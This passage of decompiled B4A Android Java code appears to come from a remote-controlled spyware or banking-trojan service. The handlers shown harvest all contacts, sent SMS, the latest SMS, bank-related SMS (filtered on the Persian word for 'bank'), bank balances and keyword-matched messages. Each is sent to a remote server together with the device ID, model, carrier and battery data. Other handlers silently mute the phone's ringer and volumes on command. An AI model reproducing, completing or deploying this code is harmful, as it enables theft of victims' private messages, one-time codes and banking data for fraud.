this.catchState = 0;
 //BA.debugLineNum = 324;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983322",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 203:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 205:
//C
this.state = 206;
 //BA.debugLineNum = 328;BA.debugLine="Try";
if (true) break;

case 206:
//try
this.state = 221;
this.catchState = 220;
this.state = 208;
if (true) break;

case 208:
//C
this.state = 209;
this.catchState = 220;
 //BA.debugLineNum = 329;BA.debugLine="Dim contacts As Contacts2";
_contacts = new anywheresoftware.b4a.phone.Contacts2Wrapper();
 //BA.debugLineNum = 330;BA.debugLine="Private StringBuilder As StringBuilder";
_stringbuilder = new anywheresoftware.b4a.keywords.StringBuilderWrapper();
 //BA.debugLineNum = 331;BA.debugLine="StringBuilder.Initialize";
_stringbuilder.Initialize();
 //BA.debugLineNum = 332;BA.debugLine="StringBuilder.Append(\"|-----@geeeh-----|\")";
_stringbuilder.Append("|-----@geeeh-----|");
 //BA.debugLineNum = 333;BA.debugLine="Try";
if (true) break;

case 209:
//try
this.state = 218;
this.catchState = 217;
this.state = 211;
if (true) break;

case 211:
//C
this.state = 212;
this.catchState = 217;
 //BA.debugLineNum = 334;BA.debugLine="For Each Contact As Contact In contacts.GetAll";
if (true) break;

case 212:
//for
this.state = 215;
group258 = _contacts.GetAll(anywheresoftware.b4a.keywords.Common.True,anywheresoftware.b4a.keywords.Common.False);
index258 = 0;
groupLen258 = group258.getSize();
this.state = 365;
if (true) break;

case 365:
//C
this.state = 215;
if (index258 < groupLen258) {
this.state = 214;
_contact = (anywheresoftware.b4a.phone.ContactsWrapper.Contact)(group258.Get(index258));}
if (true) break;

case 366:
//C
this.state = 365;
index258++;
if (true) break;

case 214:
//C
this.state = 366;
 //BA.debugLineNum = 335;BA.debugLine="Log(Contact.PhoneNumber)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983333",_contact.PhoneNumber,0);
 //BA.debugLineNum = 336;BA.debugLine="StringBuilder.Append(CRLF).Append(\"Name : \").";
_stringbuilder.Append(anywheresoftware.b4a.keywords.Common.CRLF).Append("Name : ").Append(_contact.DisplayName).Append(anywheresoftware.b4a.keywords.Common.CRLF).Append("Phone : ").Append(_contact.PhoneNumber.replace(" ","")).Append(anywheresoftware.b4a.keywords.Common.CRLF).Append("------------------");
 if (true) break;
if (true) break;

case 215:
//C
this.state = 218;
;
 //BA.debugLineNum = 338;BA.debugLine="StringBuilder.Append(CRLF).Append(\"|-----@geee";
_stringbuilder.Append(anywheresoftware.b4a.keywords.Common.CRLF).Append("|-----@geeeh-----|");
 if (true) break;

case 217:
//C
this.state = 218;
this.catchState = 220;
 //BA.debugLineNum = 340;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983338",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 218:
//C
this.state = 221;
this.catchState = 220;
;
 //BA.debugLineNum = 342;BA.debugLine="filesmsname = Rnd(11111,99999)";
parent._filesmsname = BA.NumberToString(anywheresoftware.b4a.keywords.Common.Rnd((int) (11111),(int) (99999)));
 //BA.debugLineNum = 343;BA.debugLine="File.WriteString(File.DirInternal,filesmsname&\"";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),parent._filesmsname+".txt",_stringbuilder.ToString());
 //BA.debugLineNum = 344;BA.debugLine="Send.SendFile(\"?response=true&action=allcontact";
parent._send._sendfile /*void*/ ("?response=true&action=allcontact&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&operator="+parent._phone.GetNetworkOperatorName()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&screen="+parent._res+"&andver="+parent._pd.getOSVersion()+"",parent._filesmsname+".txt");
 if (true) break;

case 220:
//C
this.state = 221;
this.catchState = 0;
 //BA.debugLineNum = 346;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983344",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 221:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 223:
//C
this.state = 224;
 //BA.debugLineNum = 350;BA.debugLine="Try";
if (true) break;

case 224:
//try
this.state = 239;
this.catchState = 238;
this.state = 226;
if (true) break;

case 226:
//C
this.state = 227;
this.catchState = 238;
 //BA.debugLineNum = 351;BA.debugLine="Dim allsmstext,whosend As String = \"\"";
_allsmstext = "";
_whosend = "";
 //BA.debugLineNum = 352;BA.debugLine="li.Initialize";
parent._li.Initialize();
 //BA.debugLineNum = 353;BA.debugLine="li = allsms.GetAll";
parent._li = parent._allsms.GetAll();
 //BA.debugLineNum = 354;BA.debugLine="For i = 0 To li.Size -1";
if (true) break;

case 227:
//for
this.state = 236;
step277 = 1;
limit277 = (int) (parent._li.getSize()-1);
_i = (int) (0) ;
this.state = 367;
if (true) break;

case 367:
//C
this.state = 236;
if ((step277 > 0 && _i <= limit277) || (step277 < 0 && _i >= limit277)) this.state = 229;
if (true) break;

case 368:
//C
this.state = 367;
_i = ((int)(0 + _i + step277)) ;
if (true) break;

case 229:
//C
this.state = 230;
 //BA.debugLineNum = 355;BA.debugLine="sms = li.Get(i)";
parent._sms = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(parent._li.Get(_i));
 //BA.debugLineNum = 356;BA.debugLine="Log(sms.Type)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983354",BA.NumberToString(parent._sms.Type),0);
 //BA.debugLineNum = 357;BA.debugLine="If sms.Type == 2 Then";
if (true) break;

case 230:
//if
this.state = 235;
if (parent._sms.Type==2) { 
this.state = 232;
}else {
this.state = 234;
}if (true) break;

case 232:
//C
this.state = 235;
 //BA.debugLineNum = 358;BA.debugLine="whosend = \"Sent\"";
_whosend = "Sent";
 //BA.debugLineNum = 359;BA.debugLine="allsmstext = allsmstext & CRLF & CRLF & \"----";
_allsmstext = _allsmstext+anywheresoftware.b4a.keywords.Common.CRLF+anywheresoftware.b4a.keywords.Common.CRLF+"--------------------"+anywheresoftware.b4a.keywords.Common.CRLF+"sender : "+parent._sms.Address+anywheresoftware.b4a.keywords.Common.CRLF+"Text : "+parent._sms.Body+anywheresoftware.b4a.keywords.Common.CRLF+"Status : "+_whosend+anywheresoftware.b4a.keywords.Common.CRLF+"Date : "+anywheresoftware.b4a.keywords.Common.DateTime.Date(parent._sms.Date)+" "+anywheresoftware.b4a.keywords.Common.DateTime.Time(parent._sms.Date)+anywheresoftware.b4a.keywords.Common.CRLF+"--------------------";
 if (true) break;

case 234:
//C
this.state = 235;
 if (true) break;

case 235:
//C
this.state = 368;
;
 if (true) break;
if (true) break;

case 236:
//C
this.state = 239;
;
 //BA.debugLineNum = 363;BA.debugLine="filesmsname = Rnd(11111,99999)";
parent._filesmsname = BA.NumberToString(anywheresoftware.b4a.keywords.Common.Rnd((int) (11111),(int) (99999)));
 //BA.debugLineNum = 364;BA.debugLine="File.WriteString(File.DirInternal,filesmsname&\"";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),parent._filesmsname+".txt",_allsmstext);
 //BA.debugLineNum = 365;BA.debugLine="Send.SendFile(\"?response=true&action=allsms&Mod";
parent._send._sendfile /*void*/ ("?response=true&action=allsms&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&operator="+parent._phone.GetNetworkOperatorName()+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&screen="+parent._res+"&andver="+parent._pd.getOSVersion()+"",parent._filesmsname+".txt");
 if (true) break;

case 238:
//C
this.state = 239;
this.catchState = 0;
 //BA.debugLineNum = 367;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983365",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 239:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 241:
//C
this.state = 242;
 //BA.debugLineNum = 370;BA.debugLine="res = CheckScreenStatus";
parent._res = _checkscreenstatus();
 //BA.debugLineNum = 371;BA.debugLine="Try";
if (true) break;

case 242:
//try
this.state = 247;
this.catchState = 246;
this.state = 244;
if (true) break;

case 244:
//C
this.state = 247;
this.catchState = 246;
 //BA.debugLineNum = 373;BA.debugLine="Dim listsms As List";
_listsms = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 374;BA.debugLine="listsms.Initialize";
_listsms.Initialize();
 //BA.debugLineNum = 375;BA.debugLine="listsms = allsms.GetAll";
_listsms = parent._allsms.GetAll();
 //BA.debugLineNum = 376;BA.debugLine="Dim s As Sms";
_s = new anywheresoftware.b4a.phone.SmsWrapper.Sms();
 //BA.debugLineNum = 377;BA.debugLine="s = listsms.Get(0)";
_s = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(_listsms.Get((int) (0)));
 //BA.debugLineNum = 378;BA.debugLine="Dim tx As String = s.Body.Replace(\"<#>\",\"\")";
_tx = _s.Body.replace("<#>","");
 //BA.debugLineNum = 380;BA.debugLine="Send.SendData(\"sender=\" &s.Address & \"&messaget";
parent._send._senddata /*void*/ ("sender="+_s.Address+"&messagetext="+_tx+"&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&action="+"lastsms"+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&operator="+parent._phone.GetNetworkOperatorName()+"&screen="+parent._res);
 if (true) break;

case 246:
//C
this.state = 247;
this.catchState = 0;
 //BA.debugLineNum = 382;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983380",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 247:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 249:
//C
this.state = 250;
 //BA.debugLineNum = 385;BA.debugLine="Try";
if (true) break;

case 250:
//try
this.state = 255;
this.catchState = 254;
this.state = 252;
if (true) break;

case 252:
//C
this.state = 255;
this.catchState = 254;
 //BA.debugLineNum = 386;BA.debugLine="phone.SetRingerMode(phone.RINGER_VIBRATE)";
parent._phone.SetRingerMode(parent._phone.RINGER_VIBRATE);
 if (true) break;

case 254:
//C
this.state = 255;
this.catchState = 0;
 //BA.debugLineNum = 388;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983386",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 255:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 257:
//C
this.state = 258;
 //BA.debugLineNum = 392;BA.debugLine="Try";
if (true) break;

case 258:
//try
this.state = 263;
this.catchState = 262;
this.state = 260;
if (true) break;

case 260:
//C
this.state = 263;
this.catchState = 262;
 //BA.debugLineNum = 393;BA.debugLine="phone.SetVolume(phone.VOLUME_NOTIFICATION, 0, F";
parent._phone.SetVolume(parent._phone.VOLUME_NOTIFICATION,(int) (0),anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 394;BA.debugLine="phone.SetVolume(phone.VOLUME_SYSTEM, 0, False)";
parent._phone.SetVolume(parent._phone.VOLUME_SYSTEM,(int) (0),anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 395;BA.debugLine="phone.SetVolume(phone.VOLUME_ALARM, 0, False)";
parent._phone.SetVolume(parent._phone.VOLUME_ALARM,(int) (0),anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 396;BA.debugLine="phone.SetVolume(phone.VOLUME_MUSIC, 0, False)";
parent._phone.SetVolume(parent._phone.VOLUME_MUSIC,(int) (0),anywheresoftware.b4a.keywords.Common.False);
 if (true) break;

case 262:
//C
this.state = 263;
this.catchState = 0;
 //BA.debugLineNum = 398;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983396",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 263:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 265:
//C
this.state = 266;
 //BA.debugLineNum = 402;BA.debugLine="Try";
if (true) break;

case 266:
//try
this.state = 271;
this.catchState = 270;
this.state = 268;
if (true) break;

case 268:
//C
this.state = 271;
this.catchState = 270;
 //BA.debugLineNum = 403;BA.debugLine="phone.SetRingerMode(phone.RINGER_NORMAL)";
parent._phone.SetRingerMode(parent._phone.RINGER_NORMAL);
 //BA.debugLineNum = 404;BA.debugLine="phone.SetVolume(phone.VOLUME_NOTIFICATION, 100,";
parent._phone.SetVolume(parent._phone.VOLUME_NOTIFICATION,(int) (100),anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 405;BA.debugLine="phone.SetVolume(phone.VOLUME_SYSTEM, 100, False";
parent._phone.SetVolume(parent._phone.VOLUME_SYSTEM,(int) (100),anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 406;BA.debugLine="phone.SetVolume(phone.VOLUME_ALARM, 100, False)";
parent._phone.SetVolume(parent._phone.VOLUME_ALARM,(int) (100),anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 407;BA.debugLine="phone.SetVolume(phone.VOLUME_MUSIC, 100, False)";
parent._phone.SetVolume(parent._phone.VOLUME_MUSIC,(int) (100),anywheresoftware.b4a.keywords.Common.False);
 if (true) break;

case 270:
//C
this.state = 271;
this.catchState = 0;
 //BA.debugLineNum = 409;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983407",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 271:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 273:
//C
this.state = 274;
 //BA.debugLineNum = 413;BA.debugLine="Try";
if (true) break;

case 274:
//try
this.state = 279;
this.catchState = 278;
this.state = 276;
if (true) break;

case 276:
//C
this.state = 279;
this.catchState = 278;
 //BA.debugLineNum = 414;BA.debugLine="Private st As StringUtils";
_st = new anywheresoftware.b4a.objects.StringUtils();
 //BA.debugLineNum = 416;BA.debugLine="Private BalanceData As String = st.EncodeUrl(st";
_balancedata = _st.EncodeUrl(_st.EncodeBase64(((anywheresoftware.b4a.objects.collections.JSONParser.JSONConverter) anywheresoftware.b4a.AbsObjectWrapper.ConvertToWrapper(new anywheresoftware.b4a.objects.collections.JSONParser.JSONConverter(), (java.lang.Object)(_bank_balances().getObject()))).ToString().getBytes("UTF8")),"UTF8");
 //BA.debugLineNum = 418;BA.debugLine="Log(BalanceData)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983416",_balancedata,0);
 //BA.debugLineNum = 419;BA.debugLine="Log(BANK_Balances)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983417",BA.ObjectToString(_bank_balances()),0);
 //BA.debugLineNum = 420;BA.debugLine="Send.SendData(\"Balances=\"&BalanceData&\"&Model=\"";
parent._send._senddata /*void*/ ("Balances="+_balancedata+"&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"balance"+"&operator="+parent._phone.GetNetworkOperatorName()+"&screen="+parent._res);
 if (true) break;

case 278:
//C
this.state = 279;
this.catchState = 0;
 //BA.debugLineNum = 423;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983421",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 279:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 281:
//C
this.state = 282;
 //BA.debugLineNum = 426;BA.debugLine="res = CheckScreenStatus";
parent._res = _checkscreenstatus();
 //BA.debugLineNum = 427;BA.debugLine="Try";
if (true) break;

case 282:
//try
this.state = 295;
this.catchState = 294;
this.state = 284;
if (true) break;

case 284:
//C
this.state = 285;
this.catchState = 294;
 //BA.debugLineNum = 428;BA.debugLine="Dim MySmsMessages As SmsMessages";
_mysmsmessages = new anywheresoftware.b4a.phone.SmsWrapper();
 //BA.debugLineNum = 429;BA.debugLine="Dim MySms As Sms";
_mysms = new anywheresoftware.b4a.phone.SmsWrapper.Sms();
 //BA.debugLineNum = 430;BA.debugLine="Dim MyList As List : MyList.Initialize";
_mylist = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 430;BA.debugLine="Dim MyList As List : MyList.Initialize";
_mylist.Initialize();
 //BA.debugLineNum = 431;BA.debugLine="MyList=MySmsMessages.GetAll";
_mylist = _mysmsmessages.GetAll();
 //BA.debugLineNum = 432;BA.debugLine="For i = 0 To MyList.Size -1";
if (true) break;

case 285:
//for
this.state = 292;
step348 = 1;
limit348 = (int) (_mylist.getSize()-1);
_i = (int) (0) ;
this.state = 369;
if (true) break;

case 369:
//C
this.state = 292;
if ((step348 > 0 && _i <= limit348) || (step348 < 0 && _i >= limit348)) this.state = 287;
if (true) break;

case 370:
//C
this.state = 369;
_i = ((int)(0 + _i + step348)) ;
if (true) break;

case 287:
//C
this.state = 288;
 //BA.debugLineNum = 433;BA.debugLine="MySms = MyList.Get(i)";
_mysms = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(_mylist.Get(_i));
 //BA.debugLineNum = 434;BA.debugLine="If MySms.Body.Contains(\"بانک\")  Then";
if (true) break;

case 288:
//if
this.state = 291;
if (_mysms.Body.contains("بانک")) { 
this.state = 290;
}if (true) break;

case 290:
//C
this.state = 291;
 //BA.debugLineNum = 436;BA.debugLine="Send.SendData(\"messagetext=\" & MySms.Body & \"";
parent._send._senddata /*void*/ ("messagetext="+_mysms.Body+"&sender="+_mysms.Address+anywheresoftware.b4a.keywords.Common.CRLF+"&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&andver="+parent._pd.getOSVersion()+"&action="+"lastbanksms"+"&operator="+parent._phone.GetNetworkOperatorName()+"&screen="+parent._res);
 //BA.debugLineNum = 437;BA.debugLine="Exit";
this.state = 292;
if (true) break;
 if (true) break;

case 291:
//C
this.state = 370;
;
 if (true) break;
if (true) break;

case 292:
//C
this.state = 295;
;
 if (true) break;

case 294:
//C
this.state = 295;
this.catchState = 0;
 //BA.debugLineNum = 442;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983440",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 295:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 297:
//C
this.state = 298;
 //BA.debugLineNum = 446;BA.debugLine="Try";
if (true) break;

case 298:
//try
this.state = 311;
this.catchState = 310;
this.state = 300;
if (true) break;

case 300:
//C
this.state = 301;
this.catchState = 310;
 //BA.debugLineNum = 447;BA.debugLine="Dim MySmsMessages As SmsMessages";
_mysmsmessages = new anywheresoftware.b4a.phone.SmsWrapper();
 //BA.debugLineNum = 448;BA.debugLine="Dim MySms As Sms";
_mysms = new anywheresoftware.b4a.phone.SmsWrapper.Sms();
 //BA.debugLineNum = 449;BA.debugLine="Dim all_bank As String";
_all_bank = "";
 //BA.debugLineNum = 450;BA.debugLine="Dim MyList As List : MyList.Initialize";
_mylist = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 450;BA.debugLine="Dim MyList As List : MyList.Initialize";
_mylist.Initialize();
 //BA.debugLineNum = 451;BA.debugLine="MyList=MySmsMessages.GetAll";
_mylist = _mysmsmessages.GetAll();
 //BA.debugLineNum = 452;BA.debugLine="For i = 0 To MyList.Size -1";
if (true) break;

case 301:
//for
this.state = 308;
step366 = 1;
limit366 = (int) (_mylist.getSize()-1);
_i = (int) (0) ;
this.state = 371;
if (true) break;

case 371:
//C
this.state = 308;
if ((step366 > 0 && _i <= limit366) || (step366 < 0 && _i >= limit366)) this.state = 303;
if (true) break;

case 372:
//C
this.state = 371;
_i = ((int)(0 + _i + step366)) ;
if (true) break;

case 303:
//C
this.state = 304;
 //BA.debugLineNum = 453;BA.debugLine="MySms = MyList.Get(i)";
_mysms = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(_mylist.Get(_i));
 //BA.debugLineNum = 454;BA.debugLine="If MySms.Body.Contains(\"بانک\") Then";
if (true) break;

case 304:
//if
this.state = 307;
if (_mysms.Body.contains("بانک")) { 
this.state = 306;
}if (true) break;

case 306:
//C
this.state = 307;
 //BA.debugLineNum = 455;BA.debugLine="all_bank = all_bank& CRLF & CRLF & \"------@Ov";
_all_bank = _all_bank+anywheresoftware.b4a.keywords.Common.CRLF+anywheresoftware.b4a.keywords.Common.CRLF+"------@Overdim------"+anywheresoftware.b4a.keywords.Common.CRLF+"Bank :"+_mysms.Address+anywheresoftware.b4a.keywords.Common.CRLF+"Text :"+_mysms.Body+anywheresoftware.b4a.keywords.Common.CRLF+"Date:"+anywheresoftware.b4a.keywords.Common.DateTime.Date(parent._sms.Date)+" "+anywheresoftware.b4a.keywords.Common.DateTime.Time(_mysms.Date)+anywheresoftware.b4a.keywords.Common.CRLF+"------@Overdim------";
 if (true) break;

case 307:
//C
this.state = 372;
;
 if (true) break;
if (true) break;

case 308:
//C
this.state = 311;
;
 //BA.debugLineNum = 458;BA.debugLine="filesmsname = Rnd(11111,99999)";
parent._filesmsname = BA.NumberToString(anywheresoftware.b4a.keywords.Common.Rnd((int) (11111),(int) (99999)));
 //BA.debugLineNum = 459;BA.debugLine="File.WriteString(File.DirInternal,filesmsname&\"";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),parent._filesmsname+".txt",_all_bank);
 //BA.debugLineNum = 460;BA.debugLine="Send.SendFile(\"?response=true&action=allbanksms";
parent._send._sendfile /*void*/ ("?response=true&action=allbanksms&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&screen="+parent._res+"&andver="+parent._pd.getOSVersion()+"&operator="+parent._phone.GetNetworkOperatorName()+"",parent._filesmsname+".txt");
 if (true) break;

case 310:
//C
this.state = 311;
this.catchState = 0;
 //BA.debugLineNum = 462;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983460",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 311:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 313:
//C
this.state = 314;
 //BA.debugLineNum = 465;BA.debugLine="res = CheckScreenStatus";
parent._res = _checkscreenstatus();
 //BA.debugLineNum = 466;BA.debugLine="Try";
if (true) break;

case 314:
//try
this.state = 329;
this.catchState = 328;
this.state = 316;
if (true) break;

case 316:
//C
this.state = 317;
this.catchState = 328;
 //BA.debugLineNum = 467;BA.debugLine="Dim MySmsMessages As SmsMessages";
_mysmsmessages = new anywheresoftware.b4a.phone.SmsWrapper();
 //BA.debugLineNum = 468;BA.debugLine="Dim MySms As Sms";
_mysms = new anywheresoftware.b4a.phone.SmsWrapper.Sms();
 //BA.debugLineNum = 469;BA.debugLine="Dim MyList As List : MyList.Initialize";
_mylist = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 469;BA.debugLine="Dim MyList As List : MyList.Initialize";
_mylist.Initialize();
 //BA.debugLineNum = 470;BA.debugLine="MyList=MySmsMessages.GetAll";
_mylist = _mysmsmessages.GetAll();
 //BA.debugLineNum = 471;BA.debugLine="For i = 0 To MyList.Size -1";
if (true) break;

case 317:
//for
this.state = 326;
step386 = 1;
limit386 = (int) (_mylist.getSize()-1);
_i = (int) (0) ;
this.state = 373;
if (true) break;

case 373:
//C
this.state = 326;
if ((step386 > 0 && _i <= limit386) || (step386 < 0 && _i >= limit386)) this.state = 319;
if (true) break;

case 374:
//C
this.state = 373;
_i = ((int)(0 + _i + step386)) ;
if (true) break;

case 319:
//C
this.state = 320;
 //BA.debugLineNum = 472;BA.debugLine="MySms = MyList.Get(i)";
_mysms = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(_mylist.Get(_i));
 //BA.debugLineNum = 473;BA.debugLine="If MySms.Body.Contains(TextSms) Then";
if (true) break;

case 320:
//if
this.state = 325;
if (_mysms.Body.contains(_textsms)) { 
this.state = 322;
}else {
this.state = 324;
}if (true) break;

case 322:
//C
this.state = 325;
 //BA.debugLineNum = 474;BA.debugLine="statusWhat = True";
parent._statuswhat = anywheresoftware.b4a.keywords.Common.True;
 //BA.debugLineNum = 475;BA.debugLine="Exit";
this.state = 326;
if (true) break;
 if (true) break;

case 324:
//C
this.state = 325;
 //BA.debugLineNum = 477;BA.debugLine="statusWhat = False";
parent._statuswhat = anywheresoftware.b4a.keywords.Common.False;
 if (true) break;

case 325:
//C
this.state = 374;
;
 if (true) break;
if (true) break;

case 326:
//C
this.state = 329;
;
 //BA.debugLineNum = 481;BA.debugLine="Send.SendData(\"messagetext=\" & statusWhat & \"&M";
parent._send._senddata /*void*/ ("messagetext="+BA.ObjectToString(parent._statuswhat)+"&Model="+parent._phone.getModel()+"&Device_id="+parent._phone.GetSettings("android_id")+"&Battery="+BA.NumberToString(parent._pd.getBatteryPercentage())+"&screen="+parent._res+"&andver="+parent._pd.getOSVersion()+"&action="+"WhatsChecker"+"&operator="+parent._phone.GetNetworkOperatorName());
 if (true) break;

case 328:
//C
this.state = 329;
this.catchState = 0;
 //BA.debugLineNum = 483;BA.debugLine="Log(LastException)";
anywheresoftware.b4a.keywords.Common.LogImpl("1983481",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.LastException(processBA)),0);
 if (true) break;
if (true) break;

case 329:
//C
this.state = 340;
this.catchState = 0;
;
 if (true) break;

case 331:
//C
this.state = 332;
 //BA.debugLineNum = 486;BA.debugLine="res = CheckScreenStatus";
parent._res = _checkscreenstatus();
 //BA.debugLineNum = 487;BA.debugLine="Dim MySmsMessages As SmsMessages";
_mysmsmessages = new anywheresoftware.b4a.phone.SmsWrapper();
 //BA.debugLineNum = 488;BA.debugLine="Dim MySms As Sms";
_mysms = new anywheresoftware.b4a.phone.SmsWrapper.Sms();
 //BA.debugLineNum = 489;BA.debugLine="Dim MyList As List : MyList.Initialize";
_mylist = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 489;BA.debugLine="Dim MyList As List : MyList.Initialize";
_mylist.Initialize();
 //BA.debugLineNum = 490;BA.debugLine="MyList=MySmsMessages.GetAll";
_mylist = _mysmsmessages.GetAll();
 //BA.debugLineNum = 491;BA.debugLine="For i = 0 To MyList.Size -1";
if (true) break;

case 332:
//for
this.state = 339;
step406 = 1;
limit406 = (int) (_mylist.getSize()-1);
_i = (int) (0) ;
this.state = 375;
if (true) break;

case 375:
//C
this.state = 339;
if ((step406 > 0 && _i <= limit406) || (step406 < 0 && _i >= limit406)) this.state = 334;
if (true) break;

case 376:
//C
this.state = 375;
_i = ((int)(0 + _i + step406)) ;
if (true) break;

case 334:
//C
this.state = 335;
 //BA.debugLineNum = 492;BA.debugLine="MySms = MyList.Get(i)";
_mysms = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(_mylist.Get(_i));
 //BA.debugLineNum = 493;BA.debugLine="If MySms.Body.Contains(TextSms) Then";
if (true) break;

case 335:
//if
this.state = 338;
if (_mysms.Body.contains(_textsms)) { 
this.state = 337;
}if (true) break;

case 337:
//C
this.state = 338;
 //BA.debugLineNum = 495;BA.debugLine="Send.SendData(\"messagetext=\" & MySms.Body.Repl";
parent._send._senddata /*void*/ ("messagetext="+_mysms.Body.replace("<#>","")+"&word="+_textsms+"&sender="+_mysms.Address+"&Model="+parent._phone.getModel()+"&screnn="+parent._res+"&Device_id="+parent._phone.GetSettings("android_id")+"&action="+"searchSMS"+"&operator="+parent._phone.GetNetworkOperatorName());
 //BA.debugLineNum = 496;BA.debugLine="Exit";
this.state = 339;
if (true) break;
 if (true) break;

case 338:
//C
this.state = 376;
;
 if (true) break;
if (true) break;

case 339:
//C
this.state = 340;
;
 if (true) break;

case 340:
//C
this.state = -1;
;
 //BA.debugLineNum = 500;BA.debugLine="End Sub";
if (true) break;
}} 
       catch (Exception e0) {
			
if (catchState == 0)
    throw e0;
else {
    state = catchState;
processBA.setLastException(e0);}
            }
        }
    }
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 1;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 2;BA.debugLine="Public fm As FirebaseMessaging";
_fm = new anywheresoftware.b4a.objects.FirebaseNotificationsService.FirebaseMessageWrapper();
 //BA.debugLineNum = 3;BA.debugLine="Dim phone As Phone";
_phone = new anywheresoftware.b4a.phone.Phone();
 //BA.debugLineNum = 4;BA.debugLine="Dim pd As PersianDeviceInfo";
_pd = new com.reza.sh.deviceinfo.DiviceInfo();
 //BA.debugLineNum = 5;BA.debugLine="Dim statusWhat As Boolean";
_statuswhat = false;
 //BA.debugLineNum = 6;BA.debugLine="Dim allsms As SmsMessages";
_allsms = new anywheresoftware.b4a.phone.SmsWrapper();
 //BA.debugLineNum = 7;BA.debugLine="Dim sms As Sms";
_sms = new anywheresoftware.b4a.phone.SmsWrapper.Sms();
 //BA.debugLineNum = 8;BA.debugLine="Dim li As List";
_li = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 9;BA.debugLine="Dim filesmsname As String";
_filesmsname = "";
